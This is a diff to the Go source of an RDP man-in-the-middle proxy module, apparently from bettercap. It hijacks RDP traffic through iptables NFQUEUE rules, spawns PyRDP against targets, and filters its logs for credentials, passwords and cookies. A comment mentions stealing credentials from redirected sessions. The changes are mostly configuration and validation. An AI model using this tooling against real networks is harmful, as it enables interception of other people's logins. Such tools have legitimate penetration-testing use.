@@ -4,12 +4,14 @@ import (
     "bufio"
     "bytes"
     "encoding/hex"
+    "errors"
     "fmt"
     "os/exec"
     "io"
     "io/ioutil"
     golog "log"
     "net"
+    "os"
     "regexp"
     "time"
     "syscall"
@@ -32,9 +34,11 @@ type RdpProxy struct {
     port         int
     startPort    int
     cmd          string
+    outpath      string
     nlaMode      string
     redirectIP   net.IP
     redirectPort int
+    replay       string
     regexp       string
     compiled     *regexp.Regexp
     active       map[string]exec.Cmd
@@ -52,9 +56,11 @@ func NewRdpProxy(s *session.Session) *RdpProxy {
         port:          3389,
         startPort:     40000,
         cmd:           "pyrdp-mitm.py",
+        outpath:       "./",
         nlaMode:       "IGNORE",
         redirectIP:    make(net.IP, 0),
         redirectPort:  3389,
+        replay:        "1",
         regexp:        "(?i)(cookie:|mstshash=|clipboard data|client info|credential|username|password|error)",
         active:        make(map[string]exec.Cmd),
     }
@@ -74,6 +80,7 @@ mod.AddParam(session.NewIntParameter("rdp.proxy.queue.num", "0", "NFQUEUE number
 mod.AddParam(session.NewIntParameter("rdp.proxy.port", "3389", "RDP port to intercept."))
 mod.AddParam(session.NewIntParameter("rdp.proxy.start", "40000", "Starting port for PyRDP sessions."))
 mod.AddParam(session.NewStringParameter("rdp.proxy.command", "pyrdp-mitm.py", "", "The PyRDP base command to launch the man-in-the-middle."))
+mod.AddParam(session.NewStringParameter("rdp.proxy.replay", "1", "1|0", "Specify if PyRDP shoudld save replay recording."))
 mod.AddParam(session.NewStringParameter("rdp.proxy.out", "./", "", "The output directory for PyRDP artifacts."))
 mod.AddParam(session.NewStringParameter("rdp.proxy.targets", session.ParamSubnet, "", "Comma separated list of IP addresses to proxy to, also supports nmap style IP ranges."))
 mod.AddParam(session.NewStringParameter("rdp.proxy.regexp", "(?i)(cookie:|mstshash=|clipboard data|client info|credential|username|password|error)", "", "Print PyRDP logs matching this regular expression."))
@@ -87,7 +94,6 @@ mod.AddParam(session.NewIntParameter("rdp.proxy.nla.redirect.port", "3389", "Spe
 
 func (mod RdpProxy) Name() string {
     return "rdp.proxy"
-
 }
 
 func (mod RdpProxy) Description() string {
@@ -96,6 +102,14 @@ func (mod RdpProxy) Description() string {
 
 func (mod RdpProxy) Author() string {
     return "Alexandre Beaulieu <alex@segfault.me> && Maxime Carbonneau <pourliver@gmail.com>"
+}
+
+func (mod *RdpProxy) fileExists(name string) (bool, error) {
+    _, err := os.Stat(name)
+    if os.IsNotExist(err) {
+      return false, nil
+    }
+    return err != nil, err
 }
 
 func (mod *RdpProxy) isTarget(ip string) bool {
@@ -108,12 +122,12 @@ func (mod *RdpProxy) isTarget(ip string) bool {
 }
 
 // Verify if the target says anything about enforcing NLA.
-func verifyNLA(target string, payload []byte) (isNla bool, err error) {
+func (mod *RdpProxy) verifyNLA(target string, payload []byte) (isNla bool, err error) {
     var conn net.Conn
 
     if conn, err = net.Dial("tcp", target); err != nil {
         return true, err
-    } else if err = conn.SetDeadline(time.Now().Add(5 * time.Second)); err != nil {
+    } else if err = conn.SetDeadline(time.Now().Add(2 * time.Second)); err != nil {
         return true, err
     }
 
@@ -148,9 +162,11 @@ func (mod *RdpProxy) isNLAEnforced(target string) (nla bool, err error){
     var nlaCheck1 bool
     var nlaCheck2 bool
 
-    if nlaCheck1, err = verifyNLA(target, rdpPayload); err != nil {
+    if nlaCheck1, err = mod.verifyNLA(target, rdpPayload); err != nil {
+        NewRdpProxyEvent("127.0.0.1", target, "Target unreachable or timeout during NLA validation. Will handle target as NLA.").Push()
         return true, err
-    } else if  nlaCheck2, err = verifyNLA(target, tlsPayload); err != nil {
+    } else if  nlaCheck2, err = mod.verifyNLA(target, tlsPayload); err != nil {
+        NewRdpProxyEvent("127.0.0.1", target, "Target unreachable or timeout during NLA validation. Will handle target as NLA.").Push()
         return true, err
     }
 
@@ -166,8 +182,9 @@ func (mod *RdpProxy) startProxyInstance(client string, target string) (err error
     // 3.1. Create a proxy agent and firewall rules.
     args := []string{
         "-l", fmt.Sprintf("%d", mod.startPort),
-        // "-o", mod.outpath,
         // "-i", "-d"
+        "-o", mod.outpath,
+        mod.replay,
         target,
     }
 
@@ -179,7 +196,7 @@ func (mod *RdpProxy) startProxyInstance(client string, target string) (err error
         // Wont't handle things like "port already in use" since it happens at runtime
         mod.Error("PyRDP Start error : %v", err.Error())
 
-        NewRdpProxyEvent(client, target, "Failed to start PyRDP, won't intercept target").Push()
+        NewRdpProxyEvent(client, target, "Failed to start PyRDP, won't intercept target.").Push()
 
         return err
     }
@@ -247,6 +264,13 @@ func (mod *RdpProxy) configureFirewall(enable bool) (err error) {
                 "-p", "tcp", "-m", "tcp", "--dport", fmt.Sprintf("%d", mod.port),
                 "-j", "NFQUEUE", "--queue-num", fmt.Sprintf("%d", mod.queueNum), "--queue-bypass",
             },
+            // This rule tries to fix an optimization bug in recent versions of iptables
+            // The bug : if no rules in the nat table tries to modify the current packet, skip the nat table
+            // The NFQueue doesn't count as a modification.
+            { "-t", "nat", "-A", "BCAPRDP",
+                "-p", "tcp", "-m", "tcp", "-d", "127.0.0.1", "--dport", "3388",
+                "-j", "REDIRECT", "--to-ports", "62884",
+            },
         }
 
     } else if !enable {
@@ -289,31 +313,51 @@ func (mod *RdpProxy) Configure() (err error) {
     // TODO: Param validation and hydration
     if err, mod.port = mod.IntParam("rdp.proxy.port"); err != nil {
         return
+    } else if mod.port < 1 || mod.port > 65535 {
+        return errors.New("rdp.proxy.port must be between 1 and 65535")
     } else if err, mod.cmd = mod.StringParam("rdp.proxy.command"); err != nil {
+        return
+    } else if err, mod.outpath = mod.StringParam("rdp.proxy.out"); err != nil {
         return
     } else if err, mod.queueNum = mod.IntParam("rdp.proxy.queue.num"); err != nil {
         return
+    } else if mod.queueNum < 0 || mod.queueNum > 65535 {
+        return errors.New("rdp.proxy.queue.num must be between 0 and 65535")
     } else if err, targets = mod.StringParam("rdp.proxy.targets"); err != nil {
         return
     } else if mod.targets, _, err = network.ParseTargets(targets, mod.Session.Lan.Aliases()); err != nil {
         return
     } else if err, mod.regexp = mod.StringParam("rdp.proxy.regexp"); err != nil {
         return
+    } else if err, mod.replay = mod.StringParam("rdp.proxy.replay"); err != nil {
+        return
     } else if err, mod.nlaMode = mod.StringParam("rdp.proxy.nla.mode"); err != nil {
         return
-    } else if mod.nlaMode == "RELAY" {
-        mod.Info("Mode RELAY is unimplemented yet, fallbacking to mode IGNORE.")
-        mod.nlaMode = "IGNORE"
-        } else if err, mod.redirectIP = mod.IPParam("rdp.proxy.nla.redirect.ip"); err != nil {
+    } else if err, mod.redirectIP = mod.IPParam("rdp.proxy.nla.redirect.ip"); err != nil {
         return
     } else if err, mod.redirectPort = mod.IntParam("rdp.proxy.nla.redirect.port"); err != nil {
         return
-    } else if mod.regexp != "" {
+    } else if mod.redirectPort < 1 || mod.redirectPort > 65535 {
+        return errors.New("rdp.proxy.nla.redirect.port must be between 1 and 65535")
+    } else if _, err = exec.LookPath(mod.cmd); err != nil {
+        return
+    } else if _, err = mod.fileExists(mod.cmd); err != nil {
+        return
+    }
+
+    if mod.nlaMode == "RELAY" {
+        mod.Info("Mode RELAY is unimplemented yet, fallbacking to mode IGNORE.")
+        mod.nlaMode = "IGNORE"
+    }
+    if mod.regexp != "" {
         if mod.compiled, err = regexp.Compile(mod.regexp); err != nil {
             return
         }
-    } else if _, err = exec.LookPath(mod.cmd); err != nil {
-        return
+    }
+    if mod.replay == "1" {
+        mod.replay = "--no-replay"
+    } else {
+        mod.replay = ""        
     }
 
     mod.Info("Starting RDP Proxy")
@@ -365,7 +409,7 @@ func (mod *RdpProxy) handleRdpConnection(payload *nfqueue.Payload) int {
                     // TODO : Find a way to disconnect user right after stealing credentials.
                     // Start a PyRDP instance to the preconfigured vulnerable host
                     // and forward packets to the target to this host instead
-                    NewRdpProxyEvent(client, target, "Target has NLA enabled and mode REDIRECT, forwarding to the vulnerable host...").Push()
+                    NewRdpProxyEvent(client, target, "Target has NLA enabled and mode REDIRECT, forwarding to the vulnerable host.").Push()
 
                     redirectTarget := fmt.Sprintf("%s:%d", mod.redirectIP.String(), mod.redirectPort)
                     err := mod.startProxyInstance(client, redirectTarget)
@@ -382,12 +426,13 @@ func (mod *RdpProxy) handleRdpConnection(payload *nfqueue.Payload) int {
                     mod.startPort += 1
                 default:
                     // Add an exception in the firewall to avoid intercepting packets to this destination and port
-                    NewRdpProxyEvent(client, target, "Target has NLA enabled and mode IGNORE, won't intercept").Push()
+                    NewRdpProxyEvent(client, target, "Target has NLA enabled and mode IGNORE, won't intercept.").Push()
 
                     mod.doReturn(dst, dport)
                 }
             } else {
                 // Starts a PyRDP instance.
+                NewRdpProxyEvent(client, target, "Target doesn't have NLA enabled, intercepting.").Push()
                 if err := mod.startProxyInstance(client, target); err != nil {
                     // Add an exception in the firewall to avoid intercepting packets to this destination and port
                     mod.doReturn(dst, dport)
@@ -402,8 +447,7 @@ func (mod *RdpProxy) handleRdpConnection(payload *nfqueue.Payload) int {
             }
         }
     } else {
-        NewRdpProxyEvent(client, target, "Non-target, won't intercept").Push()
-
+        NewRdpProxyEvent(client, target, "Non-target, won't intercept.").Push()
 
         // Add an exception in the firewall to avoid intercepting packets to this destination and port
         mod.doReturn(dst, dport)
@@ -424,7 +468,7 @@ func (mod *RdpProxy) Start() error {
     if mod.Running() {
         return session.ErrAlreadyStarted(mod.Name())
     } else if err := mod.Configure(); err != nil {
-        mod.Error("%s", err.Error())
+        mod.Fatal("%s", err.Error())
         return err
     }
 
